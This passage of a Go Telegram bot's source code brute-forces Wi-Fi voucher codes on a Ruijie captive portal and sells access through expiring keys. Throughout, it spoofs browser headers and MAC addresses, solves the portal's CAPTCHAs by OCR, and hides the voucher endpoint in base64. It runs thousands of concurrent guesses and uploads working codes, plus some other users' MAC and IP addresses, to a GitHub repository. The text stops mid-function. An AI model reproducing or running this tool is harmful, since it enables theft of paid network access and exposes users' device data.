package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/mymmrac/telego"
)

// ==================== CONFIGURATION ====================
var (
	BOT_TOKEN    string
	GITHUB_TOKEN string
	REPO_OWNER   string
	REPO_NAME    string
	ADMIN_ID     = "5376101564"
	CONCURRENCY  = 5000
	WEB_PORT     = "8080"
	OCR_SERVER   = "http://127.0.0.1:5000"
)

// ==================== HEADER POOLS ====================
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
}

var acceptLanguages = []string{
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9",
	"en-US,en;q=0.9,my;q=0.8",
	"en;q=0.9",
	"en-US,en;q=0.9,th;q=0.8",
	"en-US,en;q=0.8",
	"en-GB,en;q=0.9,my;q=0.7",
}

var acceptHeaders = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
}

var secCHUAs = []string{
	`"Chromium";v="148", "Google Chrome";v="148", "Not-A.Brand";v="99"`,
	`"Chromium";v="147", "Google Chrome";v="147", "Not-A.Brand";v="99"`,
	`"Chromium";v="148", "Microsoft Edge";v="148", "Not-A.Brand";v="99"`,
	`"Chromium";v="139", "Not;A=Brand";v="99"`,
}

var secCHUAPlatforms = []string{`"Windows"`, `"macOS"`, `"Linux"`, `"Android"`}
var secCHUAMobiles = []string{"?0", "?1"}

func randomUA() string              { return userAgents[rand.Intn(len(userAgents))] }
func randomAcceptLang() string      { return acceptLanguages[rand.Intn(len(acceptLanguages))] }
func randomAccept() string          { return acceptHeaders[rand.Intn(len(acceptHeaders))] }
func randomSecCHUA() string         { return secCHUAs[rand.Intn(len(secCHUAs))] }
func randomSecCHUAPlatform() string { return secCHUAPlatforms[rand.Intn(len(secCHUAPlatforms))] }
func randomSecCHUAMobile() string   { return secCHUAMobiles[rand.Intn(len(secCHUAMobiles))] }

func applyRandomHeaders(req *http.Request, referer string) {
	req.Header.Set("User-Agent", randomUA())
	req.Header.Set("Accept-Language", randomAcceptLang())
	req.Header.Set("Accept", randomAccept())
	req.Header.Set("Sec-CH-UA", randomSecCHUA())
	req.Header.Set("Sec-CH-UA-Platform", randomSecCHUAPlatform())
	req.Header.Set("Sec-CH-UA-Mobile", randomSecCHUAMobile())
	if referer != "" {
		req.Header.Set("Referer", referer)
	}
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Origin", "https://portal-as.ruijienetworks.com")
}

// ==================== DATA STRUCTURES ====================
type UserData struct{ SessionURL string }
type ScanTask struct {
	Stop   bool
	ScanID string
}
type CaptchaCache struct {
	SessionID string
	AuthCode  string
}

var (
	botr            *telego.Bot
	userData        = make(map[int64]*UserData)
	approve         = make(map[int64]bool)
	scanTasks       = make(map[int64]*ScanTask)
	successTexts    = make(map[int64][]string)
	limitedTexts    = make(map[int64][]string)
	successMessages = make(map[int64]telego.Message)
	limitedMessages = make(map[int64]telego.Message)
	notifySetting   = make(map[int64]bool)
	captchaCache    = make(map[int64]*CaptchaCache)
	mu              sync.RWMutex
	startTime       = time.Now()
	semaphore       chan struct{}
	httpClient      = &http.Client{Timeout: 15 * time.Second}

	successQueue = make(chan struct {
		ChatID int64
		Code   string
	}, 10000)
	staQueue = make(chan struct {
		Code, MAC, IP, Timestamp string
	}, 10000)
)

// ==================== UTILITY FUNCTIONS ====================
func checkKeyExpiration(expirationTime interface{}) bool {
	switch v := expirationTime.(type) {
	case map[string]interface{}:
		expiry, _ := v["expires_at"].(string)
		if expiry == "9999-12-31T23:59:59Z" {
			return true
		}
		t, err := time.Parse(time.RFC3339, expiry)
		if err != nil {
			return false
		}
		return time.Now().UTC().Before(t)
	case string:
		parts := strings.Split(v, "-")
		if len(parts) == 5 {
			var mm, hh, dd, MM, yyyy int
			fmt.Sscanf(v, "%d-%d-%d-%d-%d", &mm, &hh, &dd, &MM, &yyyy)
			t := time.Date(yyyy, time.Month(MM), dd, hh, mm, 0, 0, time.UTC)
			return time.Now().UTC().Before(t)
		}
	}
	return false
}

func generateExpiry(plan string) string {
	if plan == "unlimited" {
		return "9999-12-31T23:59:59Z"
	}
	totalSeconds := 0
	re := regexp.MustCompile(`(\d+)([dhm])`)
	for _, m := range re.FindAllStringSubmatch(plan, -1) {
		val, _ := strconv.Atoi(m[1])
		switch m[2] {
		case "d":
			totalSeconds += val * 86400
		case "h":
			totalSeconds += val * 3600
		case "m":
			totalSeconds += val * 60
		}
	}
	if totalSeconds == 0 {
		return ""
	}
	return time.Now().UTC().Add(time.Duration(totalSeconds) * time.Second).Format(time.RFC3339)
}

func getRandomMAC() string {
	firstBytes := []int{0x02, 0x06, 0x0A, 0x0E}
	mac := make([]string, 6)
	mac[0] = fmt.Sprintf("%02x", firstBytes[rand.Intn(4)])
	for i := 1; i < 6; i++ {
		mac[i] = fmt.Sprintf("%02x", rand.Intn(256))
	}
	return strings.Join(mac, ":")
}

func formatProgress(checked, total int, speed float64, found, target int) string {
	var sb strings.Builder
	sb.WriteString("📋 Status: Running\n")
	sb.WriteString(fmt.Sprintf("⚡ Speed: %.1f codes/sec\n", speed))
	if total > 0 {
		sb.WriteString(fmt.Sprintf("🔍 Checked: %d/%d\n", checked, total))
		pct := float64(checked) / float64(total) * 100
		if pct > 100 {
			pct = 100
		}
		filled := int(pct / 5)
		if filled > 20 {
			filled = 20
		}
		sb.WriteString(fmt.Sprintf("[%s%s] %.0f%%\n",
			strings.Repeat("█", filled), strings.Repeat("░", 20-filled), pct))
	} else {
		sb.WriteString(fmt.Sprintf("🔍 Checked: %d\n", checked))
	}
	sb.WriteString(fmt.Sprintf("💎 Found: %d\n", found))
	if target > 0 {
		sb.WriteString(fmt.Sprintf("🎯 Target: %d/%d", found, target))
	}
	return sb.String()
}

// ==================== CODE GENERATORS ====================
const digitsNo9 = "012345678"
const lettersNoLO = "abcdefghijkmnpqrstuvwxyz"
const allChars = "abcdefghijkmnpqrstuvwxyz012345678"

func digitGenNo9(length int) string {
	sb := strings.Builder{}
	for i := 0; i < length; i++ {
		sb.WriteByte(digitsNo9[rand.Intn(9)])
	}
	return sb.String()
}
func asciiGenClean(length int) string {
	sb := strings.Builder{}
	for i := 0; i < length; i++ {
		sb.WriteByte(lettersNoLO[rand.Intn(24)])
	}
	return sb.String()
}
func allGenClean(length int) string {
	sb := strings.Builder{}
	for i := 0; i < length; i++ {
		sb.WriteByte(allChars[rand.Intn(34)])
	}
	return sb.String()
}

// ==================== CODE FILTERS ====================
func isAllSame(s string) bool {
	for i := 1; i < len(s); i++ {
		if s[i] != s[0] {
			return false
		}
	}
	return true
}
func isIncrementing(s string) bool {
	for i := 1; i < len(s); i++ {
		if s[i] != s[i-1]+1 {
			return false
		}
	}
	return true
}
func isDecrementing(s string) bool {
	for i := 1; i < len(s); i++ {
		if s[i] != s[i-1]-1 {
			return false
		}
	}
	return true
}
func shouldSkipDigitCode(s string) bool {
	return isAllSame(s) || isIncrementing(s) || isDecrementing(s)
}

// ==================== GITHUB HELPERS ====================
func getFileContent(path string) (map[string]interface{}, string, error) {
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", REPO_OWNER, REPO_NAME, path)
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", "token "+GITHUB_TOKEN)
	applyRandomHeaders(req, "")
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return make(map[string]interface{}), "", nil
	}
	var r struct {
		Content string `json:"content"`
		SHA     string `json:"sha"`
	}
	json.NewDecoder(resp.Body).Decode(&r)
	decoded, _ := base64.StdEncoding.DecodeString(r.Content)
	var data map[string]interface{}
	json.Unmarshal(decoded, &data)
	if data == nil {
		data = make(map[string]interface{})
	}
	return data, r.SHA, nil
}

func updateFileContent(path string, content map[string]interface{}, sha, message string) error {
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", REPO_OWNER, REPO_NAME, path)
	jsonData, _ := json.Marshal(content)
	encoded := base64.StdEncoding.EncodeToString(jsonData)
	body := map[string]interface{}{"message": message, "content": encoded, "sha": sha}
	jsonBody, _ := json.Marshal(body)
	req, _ := http.NewRequest("PUT", url, bytes.NewReader(jsonBody))
	req.Header.Set("Authorization", "token "+GITHUB_TOKEN)
	req.Header.Set("Content-Type", "application/json")
	applyRandomHeaders(req, "")
	resp, err := httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// ==================== CAPTCHA SOLVER ====================
func solveCaptcha(imgBytes []byte) (string, error) {
	req, _ := http.NewRequest("POST", OCR_SERVER+"/ocr", bytes.NewReader(imgBytes))
	req.Header.Set("Content-Type", "application/octet-stream")
	resp, err := httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(body)), nil
}

// ==================== RUIJIE API CALLS ====================
func getSessionID(sessionURL, prev string) (string, error) {
	mac := getRandomMAC()
	u := regexp.MustCompile(`(?<=mac=)[^&]+`).ReplaceAllString(sessionURL, mac)
	req, _ := http.NewRequest("GET", u, nil)
	applyRandomHeaders(req, u)
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       15 * time.Second,
	}
	resp, err := client.Do(req)
	if err != nil {
		return prev, err
	}
	defer resp.Body.Close()
	loc := resp.Header.Get("Location")
	if loc == "" {
		b, _ := io.ReadAll(resp.Body)
		loc = string(b)
	}
	m := regexp.MustCompile(`[?&]sessionId=([a-zA-Z0-9]+)`).FindStringSubmatch(loc)
	if len(m) > 1 {
		return m[1], nil
	}
	return prev, nil
}

func getCaptchaImage(sid string) ([]byte, error) {
	u := fmt.Sprintf("https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId=%s&_t=%d", sid, time.Now().UnixMilli())
	req, _ := http.NewRequest("GET", u, nil)
	applyRandomHeaders(req, fmt.Sprintf("https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId=%s", sid))
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func verifyCaptcha(sid, text string) (bool, error) {
	body, _ := json.Marshal(map[string]string{"sessionId": sid, "authCode": text})
	req, _ := http.NewRequest("POST", "https://portal-as.ruijienetworks.com/api/auth/captcha/verify", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	applyRandomHeaders(req, fmt.Sprintf("https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId=%s", sid))
	resp, err := httpClient.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	var r map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&r)
	s, _ := r["success"].(bool)
	return s, nil
}

func checkVoucher(sessionURL, code string, chatID int64) (string, map[string]interface{}, error) {
	postURL, _ := base64.StdEncoding.DecodeString("aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=")

	for attempt := 0; attempt < 3; attempt++ {
		sid, _ := getSessionID(sessionURL, "")
		if sid == "" {
			continue
		}
		var authCode string
		mu.RLock()
		c, ok := captchaCache[chatID]
		mu.RUnlock()
		if ok {
			sid = c.SessionID
			authCode = c.AuthCode
		} else {
			for i := 0; i < 8; i++ {
				img, err := getCaptchaImage(sid)
				if err != nil {
					continue
				}
				text, err := solveCaptcha(img)
				if err != nil || text == "" || text == "ERROR" {
					continue
				}
				ok, _ := verifyCaptcha(sid, text)
				if ok {
					authCode = text
					mu.Lock()
					captchaCache[chatID] = &CaptchaCache{SessionID: sid, AuthCode: authCode}
					mu.Unlock()
					break
				}
			}
		}
		if authCode == "" {
			continue
		}

		data := map[string]interface{}{"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": authCode}
		jsonData, _ := json.Marshal(data)
		req, _ := http.NewRequest("POST", string(postURL), bytes.NewReader(jsonData))
		req.Header.Set("Content-Type", "application/json")
		applyRandomHeaders(req, fmt.Sprintf("https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId=%s", sid))
		resp, err := httpClient.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyStr := string(bodyBytes)

		if strings.Contains(bodyStr, "checkCaptcha") || strings.Contains(bodyStr, "Invalid verification code") {
			mu.Lock()
			delete(captchaCache, chatID)
			mu.Unlock()
			continue
		}
		if strings.Contains(bodyStr, "request limited") {
			continue
		}
		var result map[string]interface{}
		json.Unmarshal(bodyBytes, &result)
		return bodyStr, result, nil
	}
	return "", nil, fmt.Errorf("max retries")
}

func getCodeExpiresDate(sid string) string {
	u := fmt.Sprintf("https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/%s", sid)
	req, _ := http.NewRequest("GET", u, nil)
	applyRandomHeaders(req, fmt.Sprintf("https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId=%s", sid))
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	resp, err := httpClient.Do(req)
	if err != nil {
		return "Plan: Unknown | Time: Unknown"
	}
	defer resp.Body.Close()
	var r map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&r)
	profile := "Unknown"
	totaltime := "Unknown"
	if rr, ok := r["result"].(map[string]interface{}); ok {
		if p, ok := rr["profileName"].(string); ok {
			profile = p
		}
		if t, ok := rr["totalMinutes"].(float64); ok {
			mins := int(t)
			h := mins / 60
			m := mins % 60
			if h > 0 {
				totaltime = fmt.Sprintf("%dh %dm", h, m)
			} else {
				totaltime = fmt.Sprintf("%dm", m)
			}
		}
	}
	return fmt.Sprintf("Plan: %s | Time: %s", profile, totaltime)
}

// ==================== EXHAUSTIVE CODE GENERATOR ====================
func generateExhaustive(length int) []string {
	total := 1
	for i := 0; i < length; i++ {
		total *= 9
	}
	codes := make([]string, 0, total)
	for i := 0; i < total; i++ {
		code := ""
		temp := i
		for j := 0; j < length; j++ {
			code = string(digitsNo9[temp%9]) + code
			temp /= 9
		}
		for len(code) < length {
			code = "0" + code
		}
		if !shouldSkipDigitCode(code) {
			codes = append(codes, code)
		}
	}
	rand.Shuffle(len(codes), func(i, j int) { codes[i], codes[j] = codes[j], codes[i] })
	return codes
}

// ==================== BRUTE FORCE SCANNER ====================
func runBruteForce(mode string, chatID int64, sessionURL string, target, length int, progressMsg telego.Message) {
	var codes []string
	var codeIndex int
	isExhaustive := mode == "6" || mode == "7"

	if isExhaustive {
		l := 6
		if mode == "7" {
			l = 7
		}
		prepMsg := fmt.Sprintf("🔄 Preparing Scan for Mode %s...\n\n📦 Generating:  [████████░░░░░░░░░░░░] 40%%", mode)
		params := &telego.EditMessageTextParams{
			ChatID:    telego.ChatID{ID: chatID},
			MessageID: progressMsg.MessageID,
			Text:      prepMsg,
		}
		if em, err := botr.EditMessageText(params); err == nil {
			progressMsg = *em
		}
		codes = generateExhaustive(l)
		prepMsg2 := fmt.Sprintf("🔄 Preparing Scan for Mode %s...\n\n📦 Generating:  [████████████████░░░░] 80%%\n🔍 Filtering:   [████████████████████] 100%%\n🔀 Shuffling:   [████████████████████] 100%%\n\n✅ Preparation Complete! (%d codes ready)", mode, len(codes))
		params2 := &telego.EditMessageTextParams{
			ChatID:    telego.ChatID{ID: chatID},
			MessageID: progressMsg.MessageID,
			Text:      prepMsg2,
		}
		botr.EditMessageText(params2)
	} else {
		params := &telego.EditMessageTextParams{
			ChatID:    telego.ChatID{ID: chatID},
			MessageID: progressMsg.MessageID,
			Text:      "✅ Ready! Starting scan...",
		}
		botr.EditMessageText(params)
	}

	total := len(codes)
	checked, found := 0, 0
	lastKeyCheck := time.Now()
	scanStart := time.Now()

	if semaphore == nil {
		semaphore = make(chan struct{}, CONCURRENCY)
	}

	for {
		mu.RLock()
		task, exists := scanTasks[chatID]
		mu.RUnlock()
		if !exists || task.Stop {
			return
		}

		batch := make([]string, 0, 1000)
		if isExhaustive {
			for i := 0; i < 1000 && codeIndex < total; i++ {
				batch = append(batch, codes[codeIndex])
				codeIndex++
			}
			if len(batch) == 0 {
				break
			}
		} else {
			l := length
			if l == 0 {
				l = 8
				if mode == "ascii-lower" || mode == "all" {
					l = 6
				}
			}
			for i := 0; i < 1000; i++ {
				var code string
				switch mode {
				case "8":
					code = digitGenNo9(8)
				case "9":
					code = digitGenNo9(9)
				case "ascii-lower":
					code = asciiGenClean(l)
				case "all":
					code = allGenClean(l)
				}
				if (mode == "8" || mode == "9") && shouldSkipDigitCode(code) {
					continue
				}
				batch = append(batch, code)
			}
		}

		if time.Since(lastKeyCheck) >= 10*time.Minute {
			data, _, _ := getFileContent("auth_list.json")
			if kd, ok := data[fmt.Sprintf("%d", chatID)]; !ok || !checkKeyExpiration(kd) {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။",
				})
				mu.Lock()
				delete(scanTasks, chatID)
				mu.Unlock()
				return
			}
			lastKeyCheck = time.Now()
		}

		var wg sync.WaitGroup
		for _, code := range batch {
			wg.Add(1)
			go func(c string) {
				defer wg.Done()
				semaphore <- struct{}{}
				defer func() { <-semaphore }()

				mu.RLock()
				task, exists := scanTasks[chatID]
				mu.RUnlock()
				if !exists || task.Stop {
					return
				}

				bodyStr, _, err := checkVoucher(sessionURL, c, chatID)
				if err != nil {
					return
				}

				mu.Lock()
				defer mu.Unlock()

				if strings.Contains(bodyStr, "logonUrl") {
					expireInfo := "Plan: Unknown | Time: Unknown"
					if cc, ok := captchaCache[chatID]; ok {
						expireInfo = getCodeExpiresDate(cc.SessionID)
					}
					entry := fmt.Sprintf("%s | %s", c, expireInfo)
					dup := false
					for _, e := range successTexts[chatID] {
						if e == entry {
							dup = true
							break
						}
					}
					if !dup {
						successTexts[chatID] = append(successTexts[chatID], entry)
						successQueue <- struct {
							ChatID int64
							Code   string
						}{chatID, c}
						if notifySetting[chatID] {
							var sb strings.Builder
							sb.WriteString("✅ Success Codes:\n\n")
							for _, e := range successTexts[chatID] {
								parts := strings.SplitN(e, " | ", 2)
								if len(parts) == 2 {
									sb.WriteString(fmt.Sprintf("<code>%s</code> | %s\n", parts[0], parts[1]))
								} else {
									sb.WriteString(fmt.Sprintf("<code>%s</code>\n", e))
								}
							}
							text := sb.String()
							if msg, ok := successMessages[chatID]; ok {
								botr.EditMessageText(&telego.EditMessageTextParams{
									ChatID:    telego.ChatID{ID: chatID},
									MessageID: msg.MessageID,
									Text:      text,
									ParseMode: "HTML",
								})
							} else {
								sent, _ := botr.SendMessage(&telego.SendMessageParams{
									ChatID:    telego.ChatID{ID: chatID},
									Text:      text,
									ParseMode: "HTML",
								})
								if sent != nil {
									successMessages[chatID] = *sent
								}
							}
						}
					}
					found++
					if target > 0 && found >= target {
						botr.EditMessageText(&telego.EditMessageTextParams{
							ChatID:    telego.ChatID{ID: chatID},
							MessageID: progressMsg.MessageID,
							Text:      "🎯 Target reached!",
						})
						mu.Lock()
						delete(scanTasks, chatID)
						mu.Unlock()
						return
					}
				} else if strings.Contains(bodyStr, "STA") {
					mac := ""
					ip := ""
					var r map[string]interface{}
					if json.Unmarshal([]byte(bodyStr), &r) == nil {
						if m, ok := r["clientMac"].(string); ok {
							mac = m
						} else if m, ok := r["mac"].(string); ok {
							mac = m
						}
						if i, ok := r["clientIp"].(string); ok {
							ip = i
						} else if i, ok := r["ip"].(string); ok {
							ip = i
						}
					}
					staQueue <- struct {
						Code, MAC, IP, Timestamp string
					}{c, mac, ip, time.Now().UTC().Format(time.RFC3339)}
					limitedTexts[chatID] = append(limitedTexts[chatID], fmt.Sprintf("%s (MAC: %s, IP: %s)", c, mac, ip))
					if notifySetting[chatID] {
						ll := strings.Join(limitedTexts[chatID], "\n")
						text := fmt.Sprintf("⚠️ Limited Codes:\n<code>%s</code>", ll)
						if msg, ok := limitedMessages[chatID]; ok {
							botr.EditMessageText(&telego.EditMessageTextParams{
								ChatID:    telego.ChatID{ID: chatID},
								MessageID: msg.MessageID,
								Text:      text,
								ParseMode: "HTML",
							})
						} else {
							sent, _ := botr.SendMessage(&telego.SendMessageParams{
								ChatID:    telego.ChatID{ID: chatID},
								Text:      text,
								ParseMode: "HTML",
							})
							if sent != nil {
								limitedMessages[chatID] = *sent
							}
						}
					}
					found++
					if target > 0 && found >= target {
						botr.EditMessageText(&telego.EditMessageTextParams{
							ChatID:    telego.ChatID{ID: chatID},
							MessageID: progressMsg.MessageID,
							Text:      "🎯 Target reached!",
						})
						mu.Lock()
						delete(scanTasks, chatID)
						mu.Unlock()
						return
					}
				}
			}(code)
		}
		wg.Wait()

		checked += len(batch)
		elapsed := time.Since(scanStart).Seconds()
		speed := float64(checked) / elapsed
		if elapsed == 0 {
			speed = 0
		}
		botr.EditMessageText(&telego.EditMessageTextParams{
			ChatID:    telego.ChatID{ID: chatID},
			MessageID: progressMsg.MessageID,
			Text:      formatProgress(checked, total, speed, found, target),
		})
	}

	botr.EditMessageText(&telego.EditMessageTextParams{
		ChatID:    telego.ChatID{ID: chatID},
		MessageID: progressMsg.MessageID,
		Text:      "✅ Scan completed.",
	})
	mu.Lock()
	delete(scanTasks, chatID)
	delete(captchaCache, chatID)
	mu.Unlock()
}

// ==================== GITHUB UPDATERS ====================
func successUpdater() {
	for {
		time.Sleep(80 * time.Second)
		var items []struct {
			ChatID int64
			Code   string
		}
		for {
			select {
			case item := <-successQueue:
				items = append(items, item)
			default:
				goto process
			}
		}
	process:
		if len(items) == 0 {
			continue
		}
		data, sha, _ := getFileContent("result.json")
		for _, item := range items {
			cid := fmt.Sprintf("%d", item.ChatID)
			if data[cid] == nil {
				data[cid] = make([]interface{}, 0)
			}
			codes := data[cid].([]interface{})
			found := false
			for _, c := range codes {
				if fmt.Sprintf("%v", c) == item.Code {
					found = true
					break
				}
			}
			if !found {
				data[cid] = append(codes, item.Code)
			}
		}
		updateFileContent("result.json", data, sha, "Periodic Update")
	}
}

func staUpdater() {
	for {
		time.Sleep(80 * time.Second)
		var items []struct {
			Code, MAC, IP, Timestamp string
		}
		for {
			select {
			case item := <-staQueue:
				items = append(items, item)
			default:
				goto process
			}
		}
	process:
		if len(items) == 0 {
			continue
		}
		data, sha, _ := getFileContent("sta_info.json")
		for _, item := range items {
			data[item.Code] = map[string]interface{}{
				"mac": item.MAC, "ip": item.IP, "timestamp": item.Timestamp,
			}
		}
		updateFileContent("sta_info.json", data, sha, "Periodic STA Update")
	}
}

// ==================== BOT COMMAND HANDLERS ====================
func registerHandlers(b *telego.Bot) {
	botr = b
	b.HandleMessage(func(ctx *telego.Bot, msg telego.Message) {
		if msg.Text == "" {
			return
		}
		args := strings.Fields(msg.Text)
		if len(args) == 0 {
			return
		}
		chatID := msg.Chat.ChatID()
		switch args[0] {
		case "/start":
			botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: chatID},
				Text:   "Bot စတင်ပါပြီ။ /help ဖြင့် လမ်းညွှန်ကြည့်ပါ။",
			})
		case "/help":
			botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: chatID},
				Text: `📚 Command လမ်းညွှန်
/key - Key အတည်ပြုရန်
/setup [url] - Session URL
/brute <mode> [target] - Scan (6,7,8,9,ascii-lower,all)
/stop /resume /saved /notify /recheck /result
Admin: /genkey /delkey /listkeys /status /stalist /delsta`,
			})
		case "/key":
			uid := fmt.Sprintf("%d", chatID)
			data, _, _ := getFileContent("auth_list.json")
			if kd, ok := data[uid]; ok {
				if checkKeyExpiration(kd) {
					mu.Lock()
					approve[chatID] = true
					userData[chatID] = &UserData{}
					mu.Unlock()
					botr.SendMessage(&telego.SendMessageParams{
						ChatID: telego.ChatID{ID: chatID},
						Text:   "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် Session URL ထည့်ပါ။",
					})
				} else {
					botr.SendMessage(&telego.SendMessageParams{
						ChatID: telego.ChatID{ID: chatID},
						Text:   "❌ Key Expired ဖြစ်နေပါသည်။",
					})
				}
			} else {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "သင်၏ key ကို register မလုပ်ရသေးပါ။",
				})
			}
		case "/setup":
			args := strings.SplitN(msg.Text, " ", 2)
			if len(args) < 2 {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "/setup your_session_url",
				})
				return
			}
			mu.RLock()
			app := approve[chatID]
			mu.RUnlock()
			if !app {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "/key ဖြင့် အတည်ပြုပါ။",
				})
				return
			}
			if strings.Contains(args[1], "gw_id") && strings.Contains(args[1], "mac") {
				mu.Lock()
				if userData[chatID] == nil {
					userData[chatID] = &UserData{}
				}
				userData[chatID].SessionURL = args[1]
				mu.Unlock()
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။",
				})
			} else {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "Session URL မှားယွင်းနေပါသည်။",
				})
			}
		case "/brute":
			args := strings.Fields(msg.Text)
			if len(args) < 2 {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "/brute <mode> [target/length]",
				})
				return
			}
			mode := args[1]
			target, length := 0, 0
			if len(args) >= 3 {
				if mode == "ascii-lower" || mode == "all" {
					fmt.Sscanf(args[2], "%d", &length)
					if len(args) >= 4 {
						fmt.Sscanf(args[3], "%d", &target)
					}
				} else {
					fmt.Sscanf(args[2], "%d", &target)
				}
			}
			cid := chatID
			mu.RLock()
			app := approve[cid]
			_, hasSess := userData[cid]
			mu.RUnlock()
			if !app {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: cid},
					Text:   "/key အတည်ပြုပါ။",
				})
				return
			}
			if !hasSess || userData[cid].SessionURL == "" {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: cid},
					Text:   "/setup လုပ်ပါ။",
				})
				return
			}
			pm, _ := botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: cid},
				Text:   "Preparing...",
			})
			mu.Lock()
			scanTasks[cid] = &ScanTask{Stop: false, ScanID: fmt.Sprintf("%d", time.Now().UnixNano())}
			delete(successMessages, cid)
			delete(limitedMessages, cid)
			mu.Unlock()
			go runBruteForce(mode, cid, userData[cid].SessionURL, target, length, *pm)
		case "/stop":
			cid := chatID
			mu.Lock()
			if t, ok := scanTasks[cid]; ok {
				t.Stop = true
				delete(scanTasks, cid)
				delete(captchaCache, cid)
				mu.Unlock()
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: cid},
